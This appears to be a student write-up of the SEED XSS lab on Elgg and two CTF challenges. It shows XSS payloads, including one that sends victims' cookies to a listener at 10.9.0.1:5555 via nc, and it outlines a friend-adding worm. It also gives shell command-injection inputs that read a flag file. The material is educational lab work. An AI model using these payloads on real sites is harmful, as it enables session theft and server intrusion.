# Tarefas para as semana 10 e 11

## Task 1: Posting a Malicious Message to Display an Alert Window

The goal in this task is to embed a JavaScript program in a profile, such that when another user views the profile, an alert window will be displayed when the program is executed. To achieve that, we clicked on the option to edit the profile and in the "About me" section, we added the code given in the description of the task: 

**<script>alert(’XSS’);</script>**

After that, from another user's profile, when we click in the Alice's profile, the one where we added the code above, we see a message in the form of a pop-up window shown below.

![image59.png](images/image59.png)

## Task 2: Posting a Malicious Message to Display Cookies

For this task, the goal is to embed a JavaScript program in a profile, such that when the user views its own profile, an alert window would appear with that user's cookies. To achieve that, we did a similar thing as the previous task, adding this code to the brief description:

**<script>alert(document.cookie);</script>**

After that, when we log into Alice's profile, on her profile page, a see a pop-up window with a message containing the cookies.

![image60.png](images/image60.png)

## Task 3: Stealing Cookies from the Victim’s Machine

For this task, the goal is to, instead of the the user being the only one to see the cookies, we want to send them to the attacker. For that, we changed the brief description with the follwing code:

**<script>document.write(’<img src=http://10.9.0.1:5555?c=’
                       + escape(document.cookie) + ’   >’);
</script>**

We can then see the cookies by doing the command *nc -lknv 5555*.

## Task 4: Becoming the Victim’s Friend

For this task the goal is to write a program that writtes an XSS worm that adds Samy as a friend to any other user that visits Samy's profile. For that, we started by understanding what happens when a friend request is sent. 

After analysing our information and the code that was given to us, we only needed to build the url that would be used to achieve the goal of our task and add an user as a friend when they visited Samy's profile, we gathered that Samy's id was 59 so, to achieve our goal, we added the follwing code to the "About me" section , in *Edit HTML* mode:

![image61.png](images/image61.png)

We then answered some questions:

**Question 1: Explain the purpose of Lines ➀ and ➁, why are they needed?** The lines 1 and 2 get the values of the __elgg_ts and __elgg_token variables and this values are used against Cross Site Request Forgeru attacks. This values change every time a page is loaded and because of that, they need to be accessed every time. <br>

**Question 2: If the Elgg application only provide the Editor mode for the "About Me" field, i.e., you cannot switch to the Text mode, can you still launch a successful attack?** No, because if the application only provided the Editor mode, the attack will not be successful because this expecific mode adds some extra HTML and some symbols change.

 # CTF Semana 10 e 11

 ## Desafio 1

 For this challenge the goal is to make a request to the adminstrator so that he gives us access to the flag. 
 To achieve that, we started by checking what happened when a request was made, and we saw that two buttons appear, when we give the string *flag*.

 ![image62.png](images/image62.png)

 After that, we typped some HTML code and the result is was the follwing present in the screenshot:

![image63.png](images/image63.png)

![image64.png](images/image64.png)

We then inspected our code to find out what was the button id and concluded it was *giveflag*. After inserting the follwing code, we got our flag.

![image65.png](images/image65.png)
![image66.png](images/image66.png)

## Desafio 2

After analysing the page, we saw that the functionalities that were available for non authenticated users were the login, ping a host and ask for a speed report.

For this challenge, the importante functionality is pinging a host, that we concluded to be implemented by executing a shell command and then display the output.

A vulnerability that could be present here is a shell code injection and to get use of it, we need to give an initial **;** to the input.

Using the command **; ls** we obtained the following result:

![image67.png](images/image67.png)
![image68.png](images/image68.png)

To reach our flag we did gave the following input and concluded the challenge.

**; cd ..; cd ..; cd ..; cd ..; ls; cd flags; ls; cat flag.txt**

![image69.png](images/image69.png)
